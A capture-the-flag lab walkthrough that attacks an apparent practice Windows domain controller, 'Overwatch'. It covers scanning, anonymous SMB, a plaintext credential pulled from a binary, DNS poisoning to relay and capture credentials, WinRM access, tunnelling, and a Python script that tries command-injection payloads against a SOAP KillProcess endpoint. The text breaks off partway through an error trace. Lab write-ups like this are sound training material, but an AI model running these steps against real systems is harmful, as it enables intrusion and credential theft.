### Nmap
```
nmap -sV -sC -vv 10.129.20.14 

---OUTPUT---
Nmap scan report for 10.129.20.14
Host is up, received echo-reply ttl 127 (0.017s latency).
Scanned at 2026-03-31 09:13:39 EDT for 55s
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-03-31 13:13:51Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
|_ssl-date: 2026-03-31T13:14:32+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: OVERWATCH
|   NetBIOS_Domain_Name: OVERWATCH
|   NetBIOS_Computer_Name: S200401
|   DNS_Domain_Name: overwatch.htb
|   DNS_Computer_Name: S200401.overwatch.htb
|   DNS_Tree_Name: overwatch.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-31T13:13:53+00:00
| ssl-cert: Subject: commonName=S200401.overwatch.htb
| Issuer: commonName=S200401.overwatch.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-07T15:16:06
| Not valid after:  2026-06-08T15:16:06
| MD5:     0da8 f9a5 d788 e363 07b1 5f70 6524 ffcb
| SHA-1:   3287 c62d 4408 7fbb 4038 00b3 32fa da67 fb22 14bc
| SHA-256: b8ca 73a4 d338 1c57 3558 eec9 d8d1 9381 5b2d e30e 7945 ff69 0565 8935 84da f28a
| -----BEGIN CERTIFICATE-----
| MIIC7jCCAdagAwIBAgIQQB+9JS5+iIRHlnVDL5wRazANBgkqhkiG9w0BAQsFADAg
| MR4wHAYDVQQDExVTMjAwNDAxLm92ZXJ3YXRjaC5odGIwHhcNMjUxMjA3MTUxNjA2
| WhcNMjYwNjA4MTUxNjA2WjAgMR4wHAYDVQQDExVTMjAwNDAxLm92ZXJ3YXRjaC5o
| dGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDmHUjAEelxLdt0uNeO
| ah2/XpNZQsIekINBswk9QIsJPsCdFScs60OIcc+kq9JyruEYQ44SGcnAMdRM1Aal
| mhhyLcJ0BX1pqcFQASSHbClRBwzW8O+7cZaWrVRV8l616Q9dOBVqtMMe7gK/qfOF
| mdE21VNURJ4LcDQ2BUBBjy0MKcCEEImly3cCyKyS7gCHi5VZ6GlShWykPSDq75Ob
| eM3S3zrbxogClJDUmfvay9vCRVyn33DW3Bf35dno2aEaYHzg9JMboey/XfgCNxQE
| wx7/GVjFxMo4CV3uZuDEPwaKH9S89Ta56Fgg3GcRCXrFqdhTN5Y+OJ2Ej/C4Jg0F
| j2wRAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDAN
| BgkqhkiG9w0BAQsFAAOCAQEAeR1mQymcP9NndxSFRjKvk+J9t0peN+caudPqj0nU
| MrlmzV05FyNCo3AiaoLRPBg6f29dqps/H2aJPzA8E3thAdNEgnAisbDWve6Ze1Pc
| XD0iUbe/KCIhqeRTpcD57UPjBb45lTcocPDLXlz5X4iFUhEiWqJXwkCnyNM+bgZl
| uPzaH52mU+sBikSLQfAppkg5MwRA+sCK8QhivS7BcwkolFrciEpWmlr0bHS0lCiR
| xlt1TwWNi2qGwnTfrO1Kag1P/Ky10JP3+X1r/KXb+71R3KwxCW/Bs9w6ZkCcwOLp
| 1lI8KPv4qke+B5jnwoDg+7x+0kZL3G2IT4atv6rCfYHooA==
|_-----END CERTIFICATE-----
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2026-03-31T13:13:56
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 20377/tcp): CLEAN (Timeout)
|   Check 2 (port 50278/tcp): CLEAN (Timeout)
|   Check 3 (port 28619/udp): CLEAN (Timeout)
|   Check 4 (port 47780/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

- SMB null authentication works:
```
smbclient -U '' -L //10.129.20.14 --password=''

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        software$       Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.20.14 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

- I get into `software$` and find some interesting files:
```
mbclient -U '' //10.129.20.14/software$ --password=''   
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DH        0  Fri May 16 21:27:07 2025
  ..                                DHS        0  Thu Jan  1 01:46:47 2026
  Monitoring                         DH        0  Fri May 16 21:32:43 2025

                7147007 blocks of size 4096. 1482294 blocks available
smb: \> cd Monitoring\
smb: \Monitoring\> ls
  .                                  DH        0  Fri May 16 21:32:43 2025
  ..                                 DH        0  Fri May 16 21:27:07 2025
  EntityFramework.dll                AH  4991352  Thu Apr 16 16:38:42 2020
  EntityFramework.SqlServer.dll      AH   591752  Thu Apr 16 16:38:56 2020
  EntityFramework.SqlServer.xml      AH   163193  Thu Apr 16 16:38:56 2020
  EntityFramework.xml                AH  3738289  Thu Apr 16 16:38:40 2020
  Microsoft.Management.Infrastructure.dll     AH    36864  Mon Jul 17 10:46:10 2017
  overwatch.exe                      AH     9728  Fri May 16 21:19:24 2025
  overwatch.exe.config               AH     2163  Fri May 16 21:02:30 2025
  overwatch.pdb                      AH    30208  Fri May 16 21:19:24 2025
  System.Data.SQLite.dll             AH   450232  Sun Sep 29 16:41:18 2024
  System.Data.SQLite.EF6.dll         AH   206520  Sun Sep 29 16:40:06 2024
  System.Data.SQLite.Linq.dll        AH   206520  Sun Sep 29 16:40:42 2024
  System.Data.SQLite.xml             AH  1245480  Sat Sep 28 14:48:00 2024
  System.Management.Automation.dll     AH   360448  Mon Jul 17 10:46:10 2017
  System.Management.Automation.xml     AH  7145771  Mon Jul 17 10:46:10 2017
  x64                                DH        0  Fri May 16 21:32:33 2025
  x86                                DH        0  Fri May 16 21:32:33 2025

                7147007 blocks of size 4096. 1483909 blocks available
```

- `overwatch..exe.config` shows theres  something running on port 8080 caled MonitoringService. Furthermore it talks of SQLite implying there is a database somewhere


- On analyzing `overwatch.exe` I find some credentials (can either use ghidra or normal xxd):
```
xxd overwatch.exe

---RELEVANT-OUTPUT---
000018b0: 5500 7300 6500 7200 2000 4900 6400 3d00  U.s.e.r. .I.d.=.
000018c0: 7300 7100 6c00 7300 7600 6300 3b00 5000  s.q.l.s.v.c.;.P.
000018d0: 6100 7300 7300 7700 6f00 7200 6400 3d00  a.s.s.w.o.r.d.=.
000018e0: 5400 4900 3000 4c00 4b00 6300 6600 4800  T.I.0.L.K.c.f.H.
000018f0: 7a00 5a00 7700 3100 5600 7600 3b00 0017  z.Z.w.1.V.v.;...
```
 - sqlsvc:TI0LKcfHzZw1Vv

- Using this I can authenticate with LDAP:
```
ldapsearch -x -D 'overwatch\sqlsvc' -w 'TI0LKcfHzZw1Vv' -H ldap://10.129.20.14 -b "dc=overwatch,dc=htb"| grep "sAMAccountName" | awk '{print $2}'
Administrator
Guest
Administrators
Users
Guests
Print
Backup
Replicator
Remote
Network
Performance
Performance
Distributed
IIS_IUSRS
Cryptographic
Event
Certificate
RDS
RDS
RDS
Hyper-V
Access
Remote
Storage
S200401$
krbtgt
Domain
Domain
Schema
Enterprise
Cert
Domain
Domain
Domain
Group
RAS
Server
Account
Pre-Windows
Incoming
Windows
Terminal
Allowed
Denied
Read-only
Enterprise
Cloneable
Protected
Key
Enterprise
DnsAdmins
DnsUpdateProxy
SQLServer2005SQLBrowserUser$S200401
sqlsvc
sqlmgmt
SQL03$
NB001$
NB002$
FILE01$
S200400$
employees
Charlie.Moss
Tracy.Burns
Kathryn.Bryan
Rachael.Thomas
Aimee.Smith
Duncan.Freeman
John.Begum
Bernard.Hilton
Kim.Hargreaves
Douglas.Burrows
Carole.Murray
Olivia.Quinn
Trevor.Baker
Kenneth.Dennis
Jeremy.Marshall
Jodie.Jones
Thomas.Lee
Terence.Matthews
Colin.Roberts
Aaron.Robinson
Amanda.Jenkins
Debra.Arnold
Michelle.Willis
Kayleigh.Jones
Adam.Russell
Tracey.Kelly
Bethan.Dale
Mandy.Wood
Jenna.Phillips
Carole.Yates
Graham.Perry
Catherine.Griffiths
Shaun.Jackson
Bethan.Rogers
Ellie.Singh
Marie.Allan
Patrick.Holmes
Victor.Hopkins
Geraldine.Harper
George.Todd
Karl.Smith
Jacqueline.Norton
Frederick.Murray
Joe.Pearce
Paul.Collins
Damien.Edwards
Eileen.Phillips
Carl.Johnson
Kevin.Newton
Natalie.Higgins
Francis.Weston
Benjamin.Davison
Martin.Kemp
Angela.Jones
Gareth.Ahmed
Deborah.Morgan
Grace.Taylor
Roger.Hughes
Albert.Barrett
Grace.Curtis
Marilyn.Griffiths
Tracey.Barker
Suzanne.Hughes
Timothy.Jackson
Beverley.Thompson
Clare.Bartlett
Irene.Johnson
Bernard.Wood
Frank.McCarthy
Elaine.Page
Elaine.Walker
Mohammad.Hill
Glenn.Field
Deborah.Martin
Gail.Sullivan
Maureen.Kirby
Georgina.Chambers
Philip.Harris
Samantha.Scott
Ann.Hill
Chloe.Cox
Jamie.Gough
Frederick.Hussain
Dean.Hobbs
Danielle.Moore
Timothy.Smith
Declan.Stone
Jacob.Wilson
Gary.Elliott
Peter.Slater
Louise.Walton
Brett.Haynes
Elliot.Green
Wendy.Williams
Graham.Parker
Abdul.Stevens
Brett.Bailey
Benjamin.Harrison
Emily.Cooper
Roger.Spencer
```

 - I can also access sql :
```
impacket-mssqlclient sqlsvc@overwatch.htb -windows-auth -port 6520 

---OUTPUT---
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (OVERWATCH\sqlsvc  guest@master)>
```

- Rescanning with NMAP I see port 6520 open for sql:
```
sudo nmap -sS -sV -sC -vv 10.129.20.14 -Pn -p-

---OUTPUT---

```

- Looking at the links I find something interesting (db has nothing of value and no xp_cmdshell)
![[Pasted image 20260401093407.png]]
- There is another SQL07 link.

- Also trying to grab the hash via `xpdirtree` but its not crackable so SQL07 is the only path to explore:
![[Pasted image 20260401093645.png]]
![[Pasted image 20260401093658.png]]

- I then do LLMNR poisoning to add a dns record of our machine to the target SQL07:
```
python3 /opt/krbrelayx/dnstool.py -u 'overwatch.htb\sqlsvc' -p 'TI0LKcfHzZw1Vv' -r 'SQL07' -a add -d '10.10.17.206' 10.129.20.176

---OUTPUT---
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

- To confirm I use dig command to see the record:
```
dig any @10.129.20.176 SQL07.overwatch.htb                                                                
---OUTPUT---
; <<>> DiG 9.20.18-1-Debian <<>> any @10.129.20.176 SQL07.overwatch.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 45219
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;SQL07.overwatch.htb.           IN      ANY

;; ANSWER SECTION:
SQL07.overwatch.htb.    180     IN      A       10.10.17.206

;; Query time: 59 msec
;; SERVER: 10.129.20.176#53(10.129.20.176) (TCP)
;; WHEN: Wed Apr 01 09:43:02 EDT 2026
;; MSG SIZE  rcvd: 64

```


- Now we can connect to mssql and query SQL07 to get a response on our responder:
```
impacket-mssqlclient sqlsvc@overwatch.htb -windows-auth -port 6520

SELECT * FROM [SQL07].master.sys.databases;
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Communication link failure".
ERROR(MSOLEDBSQL): Line 0: TCP Provider: An existing connection was forcibly closed by the remote host.
```

- On my responder

![[Pasted image 20260401094700.png]]

- I can log in to the target now:
```
evil-winrm -i 10.129.20.176 -u 'sqlmgmt' -p 'bIhBbzMMnB82yx'
```
![[Pasted image 20260401095056.png]]
- grab the user flag:
![[Pasted image 20260401095148.png]]

- Checking winPEAS there is anotther port 8000 open (many more but this one under 10k). Using chisel or ligolo I tunnel this port running locally through to my machine.
![[Pasted image 20260401105754.png]]

 - Local side setup:
```
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.129.20.0/24 dev ligolo
sudo ip route add 240.0.0.1/32 dev ligolo

./proxy -selfcert -laddr 0.0.0.0:9000
```

- Target machine setup:
```
.\agent.exe -connect 10.10.17.206:9000 -ignore-cert
```

- Starting tunnel:
```
session
1
start
```

- Then on my browser I can access the http site : http://240.0.0.1:8000/MonitorService (the subdirectory Monitoring Service gives a page)
```

```
![[Pasted image 20260402043128.png]]

- If we access the link shown in the page we get the full file for the service:
![[Pasted image 20260402043359.png]]

```
<wsdl:definitions name="MonitoringService" targetNamespace="http://tempuri.org/">
<wsdl:types>
<xs:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">
<xs:element name="StartMonitoring">
<xs:complexType>
<xs:sequence/>
</xs:complexType>
</xs:element>
<xs:element name="StartMonitoringResponse">
<xs:complexType>
<xs:sequence>
<xs:element minOccurs="0" name="StartMonitoringResult" nillable="true" type="xs:string"/>
</xs:sequence>
</xs:complexType>
</xs:element>
<xs:element name="StopMonitoring">
<xs:complexType>
<xs:sequence/>
</xs:complexType>
</xs:element>
<xs:element name="StopMonitoringResponse">
<xs:complexType>
<xs:sequence>
<xs:element minOccurs="0" name="StopMonitoringResult" nillable="true" type="xs:string"/>
</xs:sequence>
</xs:complexType>
</xs:element>
<xs:element name="KillProcess">
<xs:complexType>
<xs:sequence>
<xs:element minOccurs="0" name="processName" nillable="true" type="xs:string"/>
</xs:sequence>
</xs:complexType>
</xs:element>
<xs:element name="KillProcessResponse">
<xs:complexType>
<xs:sequence>
<xs:element minOccurs="0" name="KillProcessResult" nillable="true" type="xs:string"/>
</xs:sequence>
</xs:complexType>
</xs:element>
</xs:schema>
<xs:schema attributeFormDefault="qualified" elementFormDefault="qualified" targetNamespace="http://schemas.microsoft.com/2003/10/Serialization/">
<xs:element name="anyType" nillable="true" type="xs:anyType"/>
<xs:element name="anyURI" nillable="true" type="xs:anyURI"/>
<xs:element name="base64Binary" nillable="true" type="xs:base64Binary"/>
<xs:element name="boolean" nillable="true" type="xs:boolean"/>
<xs:element name="byte" nillable="true" type="xs:byte"/>
<xs:element name="dateTime" nillable="true" type="xs:dateTime"/>
<xs:element name="decimal" nillable="true" type="xs:decimal"/>
<xs:element name="double" nillable="true" type="xs:double"/>
<xs:element name="float" nillable="true" type="xs:float"/>
<xs:element name="int" nillable="true" type="xs:int"/>
<xs:element name="long" nillable="true" type="xs:long"/>
<xs:element name="QName" nillable="true" type="xs:QName"/>
<xs:element name="short" nillable="true" type="xs:short"/>
<xs:element name="string" nillable="true" type="xs:string"/>
<xs:element name="unsignedByte" nillable="true" type="xs:unsignedByte"/>
<xs:element name="unsignedInt" nillable="true" type="xs:unsignedInt"/>
<xs:element name="unsignedLong" nillable="true" type="xs:unsignedLong"/>
<xs:element name="unsignedShort" nillable="true" type="xs:unsignedShort"/>
<xs:element name="char" nillable="true" type="tns:char"/>
<xs:simpleType name="char">
<xs:restriction base="xs:int"/>
</xs:simpleType>
<xs:element name="duration" nillable="true" type="tns:duration"/>
<xs:simpleType name="duration">
<xs:restriction base="xs:duration">
<xs:pattern value="\-?P(\d*D)?(T(\d*H)?(\d*M)?(\d*(\.\d*)?S)?)?"/>
<xs:minInclusive value="-P10675199DT2H48M5.4775808S"/>
<xs:maxInclusive value="P10675199DT2H48M5.4775807S"/>
</xs:restriction>
</xs:simpleType>
<xs:element name="guid" nillable="true" type="tns:guid"/>
<xs:simpleType name="guid">
<xs:restriction base="xs:string">
<xs:pattern value="[\da-fA-F]{8}-[\da-fA-F]{4}-[\da-fA-F]{4}-[\da-fA-F]{4}-[\da-fA-F]{12}"/>
</xs:restriction>
</xs:simpleType>
<xs:attribute name="FactoryType" type="xs:QName"/>
<xs:attribute name="Id" type="xs:ID"/>
<xs:attribute name="Ref" type="xs:IDREF"/>
</xs:schema>
</wsdl:types>
<wsdl:message name="IMonitoringService_StartMonitoring_InputMessage">
<wsdl:part name="parameters" element="tns:StartMonitoring"/>
</wsdl:message>
<wsdl:message name="IMonitoringService_StartMonitoring_OutputMessage">
<wsdl:part name="parameters" element="tns:StartMonitoringResponse"/>
</wsdl:message>
<wsdl:message name="IMonitoringService_StopMonitoring_InputMessage">
<wsdl:part name="parameters" element="tns:StopMonitoring"/>
</wsdl:message>
<wsdl:message name="IMonitoringService_StopMonitoring_OutputMessage">
<wsdl:part name="parameters" element="tns:StopMonitoringResponse"/>
</wsdl:message>
<wsdl:message name="IMonitoringService_KillProcess_InputMessage">
<wsdl:part name="parameters" element="tns:KillProcess"/>
</wsdl:message>
<wsdl:message name="IMonitoringService_KillProcess_OutputMessage">
<wsdl:part name="parameters" element="tns:KillProcessResponse"/>
</wsdl:message>
<wsdl:portType name="IMonitoringService">
<wsdl:operation name="StartMonitoring">
<wsdl:input wsaw:Action="http://tempuri.org/IMonitoringService/StartMonitoring" message="tns:IMonitoringService_StartMonitoring_InputMessage"/>
<wsdl:output wsaw:Action="http://tempuri.org/IMonitoringService/StartMonitoringResponse" message="tns:IMonitoringService_StartMonitoring_OutputMessage"/>
</wsdl:operation>
<wsdl:operation name="StopMonitoring">
<wsdl:input wsaw:Action="http://tempuri.org/IMonitoringService/StopMonitoring" message="tns:IMonitoringService_StopMonitoring_InputMessage"/>
<wsdl:output wsaw:Action="http://tempuri.org/IMonitoringService/StopMonitoringResponse" message="tns:IMonitoringService_StopMonitoring_OutputMessage"/>
</wsdl:operation>
<wsdl:operation name="KillProcess">
<wsdl:input wsaw:Action="http://tempuri.org/IMonitoringService/KillProcess" message="tns:IMonitoringService_KillProcess_InputMessage"/>
<wsdl:output wsaw:Action="http://tempuri.org/IMonitoringService/KillProcessResponse" message="tns:IMonitoringService_KillProcess_OutputMessage"/>
</wsdl:operation>
</wsdl:portType>
<wsdl:binding name="BasicHttpBinding_IMonitoringService" type="tns:IMonitoringService">
<soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>
<wsdl:operation name="StartMonitoring">
<soap:operation soapAction="http://tempuri.org/IMonitoringService/StartMonitoring" style="document"/>
<wsdl:input>
<soap:body use="literal"/>
</wsdl:input>
<wsdl:output>
<soap:body use="literal"/>
</wsdl:output>
</wsdl:operation>
<wsdl:operation name="StopMonitoring">
<soap:operation soapAction="http://tempuri.org/IMonitoringService/StopMonitoring" style="document"/>
<wsdl:input>
<soap:body use="literal"/>
</wsdl:input>
<wsdl:output>
<soap:body use="literal"/>
</wsdl:output>
</wsdl:operation>
<wsdl:operation name="KillProcess">
<soap:operation soapAction="http://tempuri.org/IMonitoringService/KillProcess" style="document"/>
<wsdl:input>
<soap:body use="literal"/>
</wsdl:input>
<wsdl:output>
<soap:body use="literal"/>
</wsdl:output>
</wsdl:operation>
</wsdl:binding>
<wsdl:service name="MonitoringService">
<wsdl:port name="BasicHttpBinding_IMonitoringService" binding="tns:BasicHttpBinding_IMonitoringService">
<soap:address location="http://overwatch.htb:8000/MonitorService"/>
</wsdl:port>
</wsdl:service>
</wsdl:definitions>
```

- Based on this we know that the wsdl service uses 3 processes. the most intersting being KillProcess. I try a basic xml payload to see if it works:
```
import requests
from xml.sax.saxutils import escape

url = "http://240.0.0.1:8000/MonitorService"
headers = {"Content-Type": "text/xml"}

def soap_kill(process_name, timeout=5):
    safe = escape(process_name)  # escapes &, <, >
    payload = f"""<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://tempuri.org/">
  <soap:Body>
    <tns:KillProcess>
      <tns:processName>{safe}</tns:processName>
    </tns:KillProcess>
  </soap:Body>
</soap:Envelope>"""
    try:
        r = requests.post(
            url,
            headers={**headers, "SOAPAction": '"http://tempuri.org/IMonitoringService/KillProcess"'},
            data=payload,
            timeout=timeout
        )
        return r.text
    except requests.exceptions.Timeout:
        return "[TIMEOUT]"

# Start monitoring first
requests.post(url, headers={**headers, "SOAPAction": '"http://tempuri.org/IMonitoringService/StartMonitoring"'},
    data='<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://tempuri.org/"><soap:Body><tns:StartMonitoring/></soap:Body></soap:Envelope>')

injections = [
    "notepad & whoami",
    "notepad && whoami",
    "notepad | whoami",
    "notepad || whoami",
]

for i in injections:
    print(f"[*] Trying: {i!r}")
    print(soap_kill(i))
    print()
```
- This code tries to pass some injected payloads to see if anything happens. However I receive an error message:
```
[*] StartMonitoring:
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><StartMonitoringResponse xmlns="http://tempuri.org/"><StartMonitoringResult>Monitoring started.</StartMonitoringResult></StartMonitoringResponse></s:Body></s:Envelope>
[*] Trying: 'notepad'
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><s:Fault><faultcode xmlns:a="http://schemas.microsoft.com/net/2005/12/windowscommunicationfoundation/dispatcher">a:DeserializationFailed</faultcode><faultstring xml:lang="en-US">The formatter threw an exception while trying to deserialize the message: Error in deserializing body of request message for operation 'KillProcess'. Unexpected end of file. Following elements are not closed: processName, KillProcess, Body, Envelope. Line 6, position 17.</faultstring><detail><ExceptionDetail xmlns="http://schemas.datacontract.org/2004/07/System.ServiceModel" xmlns:i="http://www.w3.org/2001/XMLSchema-instance"><HelpLink i:nil="true"/><InnerException><HelpLink i:nil="true"/><InnerException i:nil="true"/><Message>Unexpected end of file. Following elements are not closed: processName, KillProcess, Body, Envelope. Line 6, position 17.</Message><StackTrace>   at System.Xml.XmlExceptionHelper.ThrowXmlException(XmlDictionaryReader reader, String res, String arg1, String arg2, String arg3)&#xD;
   at System.Xml.XmlExceptionHelper.ThrowUnexpectedEndOfFile(XmlDictionaryReader reader)&#xD;
   at System.Xml.XmlBufferReader.GetByteHard()&#xD;
   at System.Xml.XmlUTF8TextReader.ReadCharRef()&#xD;
   at System.Xml.XmlUTF8TextReader.ReadEscapedText()&#xD;
   at System.Xml.XmlUTF8TextReader.Read()&#xD;
   at System.Xml.XmlDictionaryReader.ReadContentAsString(Int32 maxStringContentLength)&#xD;
   at System.Xml.XmlBaseReader.ReadElementContentAsString()&#xD;
   at System.ServiceModel.Dispatcher.PrimitiveOperationFormatter.DeserializeParameters(XmlDictionaryReader reader, PartInfo[] parts, Object[] parameters)&#xD;
   at System.ServiceModel.Dispatcher.PrimitiveOperationFormatter.DeserializeRequest(XmlDictionaryReader reader, Object[] parameters)&#xD;
   at System.ServiceModel.Dispatcher.PrimitiveOperationFormatter.DeserializeRequest(Message message, Object[] parameters)</StackTrace><Type>System.Xml.XmlException</Type></InnerException><Message>The formatter threw an exception while trying to deserialize the message: Error in deserializing body of request message for operation 'KillProcess'. Unexpected end of file. Following elements are not closed: processName, KillProcess, Body, Envelope. Line 6, position 17.</Message><StackTrace>   at System.ServiceModel.Dispatcher.PrimitiveOperationFormatter.DeserializeRequest(Message message, Object[] parameters)&#xD;
   at System.ServiceModel.Dispatcher.DispatchOperationRuntime.DeserializeInputs(MessageRpc&amp; rpc)&#xD;
   at System.ServiceModel.Dispatcher.DispatchOperationRuntime.InvokeBegin(MessageRpc&amp; rpc)&#xD;
   at System.ServiceModel.Dispatcher.ImmutableDispatchRuntime.ProcessMessage5(MessageRpc&amp; rpc)&#xD;
   at System.ServiceModel.Dispatcher.ImmutableDispatchRuntime.ProcessMessage11(MessageRpc&amp; rpc)&#xD;
   at System.ServiceModel.Dispatcher.MessageRpc.Process(Boolean isOperationContextSet)</StackTrace><Type>System.ServiceModel.Dispatcher.NetDispatcherFaultException</Type></ExceptionDetail></detail></s:Fault></s:Body></s:Envelope>
[*] Trying: 'notepad & whoami'
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><s:Fault><faultcode xmlns:a="http://schemas.microsoft.com/net/2005/12/windowscommunicationfoundation/dispatcher">a:DeserializationFailed</faultcode><faultstring xml:lang="en-US">The formatter threw an exception while trying to deserialize the message: Error in deserializing body of request message for operation 'KillProcess'. Unexpected end of file. Following elements are not closed: processName, KillProcess, Body, Envelope. Line 6, position 17.</faultstring><detail><ExceptionDetail xmlns="http://schemas.datacontract.org/2004/07/System.ServiceModel" xmlns:i="http://www.w3.org/2001/XMLSchema-instance"><HelpLink i:nil="true"/><InnerException><HelpLink i:nil="true"/><InnerException i:nil="true"/><Message>Unexpected end of file. Following elements are not closed: processName, KillProcess, Body, Envelope. Line 6, position 17.</Message><StackTrace>   at System.Xml.XmlExceptionHelper.ThrowXmlException(XmlDictionaryReader reader, String res, String arg1, String arg2, String arg3)&#xD;
   at System.Xml.XmlExceptionHelper.ThrowUnexpectedEndOfFile(XmlDictionaryReader reader)&#xD;
   at System.Xml.XmlBufferReader.GetByteHard()&#xD;
   at System.Xml.XmlUTF8TextReader.ReadCharRef()&#xD;
   at System.Xml.XmlUTF8TextReader.ReadEscapedText()&#xD;
   at System.Xml.XmlUTF8TextReader.Read()&#xD;
   at System.Xml.XmlDictionaryReader.ReadContentAsString(Int32 maxStringContentLength)&#xD;
   at System.Xml.XmlBaseReader.ReadElementContentAsString()&#xD;
   at System.ServiceModel.Dispatcher.PrimitiveOperationFormatter.DeserializeParameters(XmlDictionaryReader reader, PartInfo[] parts, Object[] parameters)&#xD;
   at System.ServiceModel.Dispatcher.PrimitiveOperationFormatter.DeserializeRequest(XmlDictionaryReader reader, Object[] parameters)&#xD;
   at System.ServiceModel.Dispatcher.PrimitiveOperationFormatter.DeserializeRequest(Message message, Object[] parameters)</StackTrace><Type>System.Xml.XmlException</Type></InnerException><Message>The formatter threw an exception while trying to deserialize the message: Error in deserializing body of request message for operation 'KillProcess'. Unexpected end of file. Following elements are not closed: processName, KillProcess, Body, Envelope. Line 6, position 17.</Message><StackTrace>   at System.ServiceModel.Dispatcher.PrimitiveOperationFormatter.DeserializeRequest(Message message, Object[] parameters)&#xD;
   at System.ServiceModel.Dispatcher.DispatchOperationRuntime.DeserializeInputs(MessageRpc&amp; rpc)&#xD;
   at System.ServiceModel.Dispatcher.DispatchOperationRuntime.InvokeBegin(MessageRpc&amp; rpc)&#xD;
   at System.ServiceModel.Dispatcher.ImmutableDispatchRuntime.ProcessMessage5(MessageRpc&amp; rpc)&#xD;
   at System.ServiceModel.Dispatcher.ImmutableDispatchRuntime.ProcessMessage11(MessageRpc&amp; rpc)&#xD;
   at System.ServiceModel.Dispatcher.MessageRpc.Process(Boolean isOperationContextSet)</StackTrace><Type>System.ServiceModel.Dispatcher.NetDispatcherFaultException</Type></ExceptionDetail></detail></s:Fault></s:Body></s:Envelope>
[*] Trying: 'notepad && whoami'
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><s:Fault><faultcode xmlns:a="http://schemas.microsoft.com/net/2005/12/windowscommunicationfoundation/dispatcher">a:DeserializationFailed</faultcode><faultstring xml:lang="en-US">The formatter threw an exception while trying to deserialize the message: Error in deserializing body of request message for operation 'KillProcess'. Unexpected end of file. Following elements are not closed: processName, KillProcess, Body, Envelope. Line 6, position 17.</faultstring><detail><ExceptionDetail xmlns="http://schemas.datacontract.org/2004/07/System.ServiceModel" xmlns:i="http://www.w3.org/2001/XMLSchema-instance"><HelpLink i:nil="true"/><InnerException><HelpLink i:nil="true"/><InnerException i:nil="true"/><Message>Unexpected end of file. Following elements are not closed: processName, KillProcess, Body, Envelope. Line 6, position 17.</Message><StackTrace>   at System.Xml.XmlExceptionHelper.ThrowXmlException(XmlDictionaryReader reader, String res, String arg1, String arg2, String arg3)&#xD;
   at System.Xml.XmlExceptionHelper.ThrowUnexpectedEndOfFile(XmlDictionaryReader reader)&#xD;
